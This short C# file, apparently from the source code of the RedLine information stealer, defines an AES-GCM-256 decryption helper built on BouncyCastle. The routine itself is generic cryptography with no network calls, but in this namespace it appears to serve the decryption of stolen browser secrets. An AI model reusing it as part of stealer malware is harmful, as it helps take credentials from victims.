using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Text;

namespace RedLine.Client.Logic.Crypto
{
	public static class AesGcm256
	{
		public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
		{
			string result = string.Empty;
			try
			{
				GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesFastEngine());
				AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);
				gcmBlockCipher.Init(forEncryption: false, parameters);
				byte[] array = new byte[gcmBlockCipher.GetOutputSize(encryptedBytes.Length)];
				int outOff = gcmBlockCipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, array, 0);
				gcmBlockCipher.DoFinal(array, outOff);
				result = Encoding.UTF8.GetString(array).TrimEnd("\r\n\0".ToCharArray());
				return result;
			}
			catch
			{
				return result;
			}
		}
	}
}
